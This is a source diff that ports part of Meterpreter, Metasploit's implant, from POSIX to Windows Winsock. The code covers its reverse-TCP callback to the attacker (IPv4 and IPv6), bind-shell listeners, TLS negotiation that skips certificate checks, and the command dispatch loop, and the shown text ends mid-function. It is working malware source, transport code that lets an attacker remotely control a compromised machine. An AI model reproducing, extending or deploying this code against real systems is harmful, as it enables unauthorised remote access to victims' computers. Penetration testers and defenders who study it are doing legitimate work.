@@ -1,32 +1,22 @@
 /*!
- * @file server_setup.c
+ * @file server_transport_tcp.c
  */
 #include "metsrv.h"
 #include "../../common/common.h"
-#include <netdb.h>
-#include <netinet/in.h>
+#include <ws2tcpip.h>
 
-// #define DEBUGTRACE 1
-
-#define TRANSPORT_ID_OFFSET 22
-
-MetsrvConfigData global_config =
-{
-	.transport = "METERPRETER_TRANSPORT_SSL\x00\x00",
-	.url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
-	.ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
-	.timeouts.values = { .expiry = 24*3600*7, .comms = 300, .retry_total = 3600, .retry_wait = 10 }
-};
-
-#define SetHandleInformation(a, b, c)
-const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
+// These fields aren't defined unless the SDK version is set to something old enough.
+// So we define them here instead of dancing with SDK versions, allowing us to move on
+// and still support older versions of Windows.
+#ifndef IPPROTO_IPV6
+#define IPPROTO_IPV6 41
+#endif
+#ifndef in6addr_any
+extern IN6_ADDR in6addr_any;
+#endif
 
 /*! @brief An array of locks for use by OpenSSL. */
-static LOCK **ssl_locks = NULL;
+static LOCK ** ssl_locks = NULL;
 
 /*!
  * @brief Perform the reverse_tcp connect.
@@ -38,11 +28,10 @@ static LOCK **ssl_locks = NULL;
  * @param expiry The session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
+static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
 {
 	DWORD result = ERROR_SUCCESS;
 	int start = current_unix_timestamp();
-
 	do
 	{
 		int retryStart = current_unix_timestamp();
@@ -58,7 +47,7 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, in
 		}
 
 		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		sleep(retryWait);
+		Sleep(retryWait * 1000);
 	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	if (result == SOCKET_ERROR)
@@ -80,20 +69,26 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, in
  */
 static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
 {
+	*socketBuffer = 0;
+
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
+
 	// prepare to connect to the attacker
-	DWORD result = ERROR_SUCCESS;
 	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	struct hostent* target = gethostbyname(host);
 	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
 
-	struct sockaddr_in sock = { 0 };
-
+	SOCKADDR_IN sock = { 0 };
 	sock.sin_addr.s_addr = inet_addr(targetIp);
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
-	*socketBuffer = 0;
 
-	result = reverse_tcp_run(socketHandle, (struct sockaddr*)&sock, sizeof(sock), retryTotal, retryWait, expiry);
+	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait, expiry);
 
 	if (result == ERROR_SUCCESS)
 	{
@@ -102,7 +97,6 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
 
 	return result;
 }
-
 
 /*!
  * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
@@ -116,42 +110,45 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
  */
 static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
 {
-	int start;
-	DWORD result = ERROR_SUCCESS;
-	SOCKET socketHandle;
-	struct addrinfo hints = { 0 };
-
 	*socketBuffer = 0;
 
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+	ADDRINFO hints = { 0 };
 	hints.ai_family = AF_INET6;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
 
-	struct addrinfo* addresses;
+	LPADDRINFO addresses;
 	if (getaddrinfo(host, service, &hints, &addresses) != 0)
 	{
-		return errno;
+		return WSAGetLastError();
 	}
 
 	// prepare to connect to the attacker
-	socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 
 	if (socketHandle == INVALID_SOCKET)
 	{
 		dprintf("[STAGELESS IPV6] failed to connect to attacker");
-		return errno;
+		return WSAGetLastError();
 	}
 
-	start = current_unix_timestamp();
+	DWORD result = ERROR_SUCCESS;
+	int start = current_unix_timestamp();
 	do
 	{
-		struct addrinfo* address = NULL;
 		int retryStart = current_unix_timestamp();
-		for (address = addresses; address != NULL; address = address->ai_next)
+		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
 		{
-			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;
+			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;
 
-			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
+			if ((result = connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
 			{
 				dprintf("[STAGELESS IPV6] Socket successfully connected");
 				*socketBuffer = socketHandle;
@@ -167,13 +164,13 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		}
 
 		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		sleep(retryWait);
+		Sleep(retryWait * 1000);
 	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	closesocket(socketHandle);
 	freeaddrinfo(addresses);
 
-	return errno;
+	return result;
 }
 
 /*!
@@ -184,48 +181,31 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
  * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
  * @return Indication of success or failure.
  */
-static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
+static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
 {
-	SOCKET acceptSocket;
 	DWORD result = ERROR_SUCCESS;
-
 	do
 	{
-		int yes = 1;
-		if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) != 0)
-		{
-			dprintf("[BIND RUN] Failed to set sock opt: %u", errno);
-			result = errno;
-			break;
-		}
-
 		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
 		{
-			dprintf("[BIND RUN] Socket failed to bind: %u", errno);
-			result = errno;
+			result = WSAGetLastError();
 			break;
 		}
-
-		dprintf("[BIND RUN] Socket bound successfully");
 
 		if (listen(listenSocket, 1) == SOCKET_ERROR)
 		{
-			result = errno;
+			result = WSAGetLastError();
 			break;
 		}
 
-		dprintf("[BIND RUN] Listening ...");
-
 		// Setup, ready to go, now wait for the connection.
-		acceptSocket = accept(listenSocket, NULL, NULL);
+		SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
 
 		if (acceptSocket == INVALID_SOCKET)
 		{
-			result = errno;
+			result = WSAGetLastError();
 			break;
 		}
-
-		dprintf("[BIND RUN] Valid socket accepted %u", acceptSocket);
 
 		*acceptSocketBuffer = acceptSocket;
 	} while (0);
@@ -238,10 +218,19 @@ static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int so
 /*!
  * @brief Listens on a port for an incoming payload request.
  * @param port Port number to listen on.
+ * @param socketBuffer Pointer to the variable that will recieve the socket file descriptor.
+ * @return Indication of success or failure.
  */
-DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
+static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
+
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
 
 	// prepare a connection listener for the attacker to connect to, and we
 	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
@@ -290,9 +279,8 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		sockAddr.sin6_port = htons(port);
 	}
 
-	return bind_tcp_run(listenSocket, (struct sockaddr*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
+	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
 }
-
 
 /*!
  * @brief A callback function used by OpenSSL to leverage native system locks.
@@ -301,11 +289,14 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
  * @param file Unused.
  * @param line Unused.
  */
-static void server_locking_callback(int mode, int type, const char *file, int line)
+static VOID server_locking_callback(int mode, int type, const char * file, int line)
 {
-	if (mode & CRYPTO_LOCK) {
+	if (mode & CRYPTO_LOCK)
+	{
 		lock_acquire(ssl_locks[type]);
-	} else {
+	}
+	else
+	{
 		lock_release(ssl_locks[type]);
 	}
 }
@@ -315,9 +306,9 @@ static void server_locking_callback(int mode, int type, const char *file, int li
  * @returns The current thread ID.
  * @remarks While not needed on windows this must be used for posix meterpreter.
  */
-static long unsigned int server_threadid_callback(void)
+static long unsigned int server_threadid_callback(VOID)
 {
-	return pthread_self();
+	return GetCurrentThreadId();
 }
 
 /*!
@@ -326,9 +317,9 @@ static long unsigned int server_threadid_callback(void)
  * @param file _Ignored_
  * @param line _Ignored_
  */
-static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
+static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
 {
-	return (struct CRYPTO_dynlock_value *)lock_create();
+	return (struct CRYPTO_dynlock_value*)lock_create();
 }
 
 /*!
@@ -338,13 +329,16 @@ static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, 
  * @param file _Ignored_
  * @param line _Ignored_
  */
-static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
-	int line)
+static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
 {
-	LOCK *lock = (LOCK *) l;
-	if (mode & CRYPTO_LOCK) {
+	LOCK* lock = (LOCK *)l;
+
+	if (mode & CRYPTO_LOCK)
+	{
 		lock_acquire(lock);
-	} else {
+	}
+	else
+	{
 		lock_release(lock);
 	}
 }
@@ -355,44 +349,53 @@ static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, co
  * @param file _Ignored_
  * @param line _Ignored_
  */
-static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
+static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
 {
-	lock_destroy((LOCK *) l);
+	lock_destroy((LOCK*)l);
 }
 
 /*!
  * @brief Flush all pending data on the connected socket before doing SSL.
  * @param remote Pointer to the remote instance.
  */
-static void server_socket_flush(Remote * remote)
+static VOID server_socket_flush(Remote* remote)
 {
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	fd_set fdread;
 	DWORD ret;
 	char buff[4096];
+
 	lock_acquire(remote->lock);
 
-	while (1) {
+	while (1)
+	{
 		struct timeval tv;
 		LONG data;
+
 		FD_ZERO(&fdread);
 		FD_SET(ctx->fd, &fdread);
 
 		// Wait for up to one second for any errant socket data to appear
 		tv.tv_sec = 1;
 		tv.tv_usec = 0;
+
 		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 		if (data == 0)
+		{
 			break;
+		}
 
 		ret = recv(ctx->fd, buff, sizeof(buff), 0);
 		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);
 
 		// The socket closed while we waited
-		if (ret == 0) {
+		if (ret == 0)
+		{
 			break;
 		}
+		continue;
 	}
+
 	lock_release(remote->lock);
 }
 
@@ -402,7 +405,7 @@ static void server_socket_flush(Remote * remote)
  * @param timeout Amount of time to wait before the poll times out (in milliseconds).
  * @return Indication of success or failure.
  */
-static LONG server_socket_poll(Remote * remote, long timeout)
+static LONG server_socket_poll(Remote* remote, long timeout)
 {
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	struct timeval tv;
@@ -410,17 +413,17 @@ static LONG server_socket_poll(Remote * remote, long timeout)
 	fd_set fdread;
 
 	lock_acquire(remote->lock);
+
 	FD_ZERO(&fdread);
 	FD_SET(ctx->fd, &fdread);
+
 	tv.tv_sec = 0;
 	tv.tv_usec = timeout;
+
 	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
-	if (result == -1 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) {
-		result = 0;
-	}
-
 	lock_release(remote->lock);
+
 	return result;
 }
 
@@ -429,9 +432,9 @@ static LONG server_socket_poll(Remote * remote, long timeout)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-static int server_initialize_ssl(Remote * remote)
+static BOOL server_initialize_ssl(Remote* remote)
 {
-	int i;
+	int i = 0;
 
 	lock_acquire(remote->lock);
 
@@ -441,14 +444,15 @@ static int server_initialize_ssl(Remote * remote)
 	SSL_library_init();
 
 	// Setup the required OpenSSL multi-threaded enviroment...
-	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
-	if (ssl_locks == NULL) {
-			dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
+	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
+	if (ssl_locks == NULL)
+	{
 		lock_release(remote->lock);
-		return -1;
+		return FALSE;
 	}
 
-	for (i = 0; i < CRYPTO_num_locks(); i++) {
+	for (i = 0; i < CRYPTO_num_locks(); i++)
+	{
 		ssl_locks[i] = lock_create();
 	}
 
@@ -457,9 +461,10 @@ static int server_initialize_ssl(Remote * remote)
 	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
 	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
 	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
+
 	lock_release(remote->lock);
 
-	return 0;
+	return TRUE;
 }
 
 /*!
@@ -467,32 +472,33 @@ static int server_initialize_ssl(Remote * remote)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-BOOL server_destroy_ssl(Remote * remote)
+static BOOL server_destroy_ssl(Remote* remote)
 {
-	TcpTransportContext* ctx = NULL;
-	int i;
+	int i = 0;
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 
-	if (remote) {
-		dprintf("[SERVER] Destroying SSL");
-		lock_acquire(remote->lock);
-		if (remote->transport && remote->transport->ctx) {
-			ctx = (TcpTransportContext*)remote->transport->ctx;
-			SSL_free(ctx->ssl);
-			SSL_CTX_free(ctx->ctx);
-		}
-		CRYPTO_set_locking_callback(NULL);
-		CRYPTO_set_id_callback(NULL);
-		CRYPTO_set_dynlock_create_callback(NULL);
-		CRYPTO_set_dynlock_lock_callback(NULL);
-		CRYPTO_set_dynlock_destroy_callback(NULL);
+	dprintf("[SERVER] Destroying SSL");
 
-		for (i = 0; i < CRYPTO_num_locks(); i++) {
-			lock_destroy(ssl_locks[i]);
-		}
+	lock_acquire(remote->lock);
 
-		free(ssl_locks);
-		lock_release(remote->lock);
+	SSL_free(ctx->ssl);
+
+	SSL_CTX_free(ctx->ctx);
+
+	CRYPTO_set_locking_callback(NULL);
+	CRYPTO_set_id_callback(NULL);
+	CRYPTO_set_dynlock_create_callback(NULL);
+	CRYPTO_set_dynlock_lock_callback(NULL);
+	CRYPTO_set_dynlock_destroy_callback(NULL);
+
+	for (i = 0; i < CRYPTO_num_locks(); i++)
+	{
+		lock_destroy(ssl_locks[i]);
 	}
+
+	free(ssl_locks);
+
+	lock_release(remote->lock);
 
 	return TRUE;
 }
@@ -502,186 +508,72 @@ BOOL server_destroy_ssl(Remote * remote)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-static BOOL server_negotiate_ssl(Remote * remote)
+static BOOL server_negotiate_ssl(Remote *remote)
 {
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	BOOL success = TRUE;
+	SOCKET fd = 0;
 	DWORD ret = 0;
 	DWORD res = 0;
-	lock_acquire(remote->lock);
-
-	ctx->meth = TLSv1_client_method();
-	ctx->ctx = SSL_CTX_new(ctx->meth);
-	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
-	ctx->ssl = SSL_new(ctx->ctx);
-	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
-	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
-		dprintf("[SERVER] set fd failed");
-		success = FALSE;
-		goto out;
-	}
-
-	do {
-		if ((ret = SSL_connect(ctx->ssl)) != 1) {
-			res = SSL_get_error(ctx->ssl, ret);
-			dprintf("[SERVER] connect failed %d\n", res);
-			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {
-
-				// Catch non-blocking socket errors and retry
-				continue;
-			}
-			success = FALSE;
-			break;
-		}
-	} while (ret != 1);
-
-	if (success == FALSE)
-		goto out;
-
-	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
-	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
-		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
-			SSL_get_error(ctx->ssl, ret));
-	}
-
-out:
-	lock_release(remote->lock);
-	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-	if (ret < 0) {
-		success = FALSE;
-	}
-	return success;
-}
-
-/*!
- * @brief Transmit a packet via SSL _and_ destroy it.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
- * @return An indication of the result of processing the transmission request.
- * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
- */
-DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
-{
-	CryptoContext* crypto;
-	Tlv requestId;
-	DWORD res;
-	DWORD idx;
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 
 	lock_acquire(remote->lock);
-
-	// If the packet does not already have a request identifier, create one for it
-	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
-	{
-		DWORD index;
-		CHAR rid[32];
-
-		rid[sizeof(rid)-1] = 0;
-
-		for (index = 0; index < sizeof(rid)-1; index++)
-		{
-			rid[index] = (rand() % 0x5e) + 0x21;
-		}
-
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
-	}
 
 	do
 	{
-		// If a completion routine was supplied and the packet has a request
-		// identifier, insert the completion routine into the list
-		if ((completion) &&
-			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-			&requestId) == ERROR_SUCCESS))
+		ctx->meth = TLSv1_client_method();
+
+		ctx->ctx = SSL_CTX_new(ctx->meth);
+		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
+
+		ctx->ssl = SSL_new(ctx->ctx);
+		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
+
+		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
 		{
-			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		// If the endpoint has a cipher established and this is not a plaintext
-		// packet, we encrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = packet->payloadLength;
-			PUCHAR origPayload = packet->payload;
-
-			// Encrypt
-			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
-				packet->payloadLength, &packet->payload,
-				&packet->payloadLength)) !=
-				ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// Destroy the original payload as we no longer need it
-			free(origPayload);
-
-			// Update the header length
-			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
-		}
-
-		idx = 0;
-		while (idx < sizeof(packet->header))
-		{
-			// Transmit the packet's header (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				(LPCSTR)(&packet->header) + idx,
-				sizeof(packet->header) - idx
-				);
-
-			if (res <= 0)
-			{
-				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-				break;
-			}
-			idx += res;
-		}
-
-		if (res < 0)
-		{
+			dprintf("[SERVER] set fd failed");
+			success = FALSE;
 			break;
 		}
 
-		idx = 0;
-		while (idx < packet->payloadLength)
+		do
 		{
-			// Transmit the packet's payload (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				packet->payload + idx,
-				packet->payloadLength - idx
-				);
-
-			if (res < 0)
+			if ((ret = SSL_connect(ctx->ssl)) != 1)
 			{
+				res = SSL_get_error(ctx->ssl, ret);
+				dprintf("[SERVER] connect failed %d", res);
+
+				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
+				{
+					// Catch non-blocking socket errors and retry
+					continue;
+				}
+
+				success = FALSE;
 				break;
 			}
+		} while (ret != 1);
 
-			idx += res;
-		}
+		if (success == FALSE) break;
 
-		if (res < 0)
+		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
+
+		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
 		{
-			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-			break;
+			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
 		}
 
-		SetLastError(ERROR_SUCCESS);
 	} while (0);
-
-	res = GetLastError();
-
-	// Destroy the packet
-	packet_destroy(packet);
 
 	lock_release(remote->lock);
 
-	return res;
+	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
+
+	if (ret < 0)
+	{
+		success = FALSE;
+	}
+
+	return success;
 }
 
 /*!
@@ -850,51 +742,93 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 /*!
  * @brief The servers main dispatch loop for incoming requests using SSL over TCP
  * @param remote Pointer to the remote endpoint for this server connection.
+ * @param dispatchThread Pointer to the main dispatch thread.
  * @returns Indication of success or failure.
  */
-static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
+static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 {
+	Transport* transport = remote->transport;
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
-	Packet *packet = NULL;
-	THREAD *cpt = NULL;
+	Packet * packet = NULL;
+	THREAD * cpt = NULL;
+
 	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);
 
 	// Bring up the scheduler subsystem.
 	result = scheduler_initialize(remote);
-	if (result != ERROR_SUCCESS) {
+	if (result != ERROR_SUCCESS)
+	{
 		return result;
 	}
-	while (running) {
-		if (event_poll(dispatchThread->sigterm, 0)) {
+
+	int lastPacket = current_unix_timestamp();
+	while (running)
+	{
+		if (event_poll(dispatchThread->sigterm, 0))
+		{
 			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
 			break;
 		}
-		result = server_socket_poll(remote, 500000);
-		if (result > 0) {
+
+		result = server_socket_poll(remote, 50000);
+		if (result > 0)
+		{
 			result = packet_receive_via_ssl(remote, &packet);
-			if (result != ERROR_SUCCESS) {
+			if (result != ERROR_SUCCESS)
+			{
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
 				break;
 			}
+
 			running = command_handle(remote, packet);
 			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
-		}
 
-		else if (result < 0) {
+			// packet received, reset the timer
+			lastPacket = current_unix_timestamp();
+		}
+		else if (result == 0)
+		{
+			// check if the communication has timed out, or the session has expired, so we should terminate the session
+			int now = current_unix_timestamp();
+			if (now > transport->expiration_end || (now - lastPacket) > transport->timeouts.comms)
+			{
+				result = ERROR_SUCCESS;
+				dprintf("[DISPATCH] communications has timed out/session has ended");
+				break;
+			}
+		}
+		else
+		{
 			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
 			break;
 		}
 	}
 
-	dprintf("[DISPATCH] calling scheduler_destroy...")
+	dprintf("[DISPATCH] calling scheduler_destroy...");
 	scheduler_destroy();
 
-	dprintf("[DISPATCH] calling command_join_threads...")
+	dprintf("[DISPATCH] calling command_join_threads...");
 	command_join_threads();
 
 	dprintf("[DISPATCH] leaving server_dispatch.");
+
 	return result;
+}
+
+/*!
+ * @brief Get the socket from the transport (if it's TCP).
+ * @param transport Pointer to the TCP transport containing the socket.
+ * @return The current transport socket FD, if any, or zero.
+ */
+static SOCKET transport_get_socket_tcp(Transport* transport)
+{
+	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	{
